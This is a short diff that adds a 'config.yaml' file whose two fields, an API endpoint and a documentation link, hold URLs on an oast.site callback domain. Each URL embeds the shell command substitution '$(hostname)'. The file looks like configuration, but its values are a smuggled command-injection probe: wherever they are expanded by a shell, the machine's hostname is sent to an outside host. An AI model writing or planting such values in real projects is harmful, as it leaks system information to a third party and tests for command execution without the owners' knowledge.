@@ -1,0 +1,3 @@
+# config.yaml
+api_endpoint: "http://$(hostname).10becbc9e74b4460b47fgufig7ryyyyyr.oast.site/"
+documentation: "10becbc9e74b4460b47fgufig7ryyyyyr.oast.site/$(hostname)"
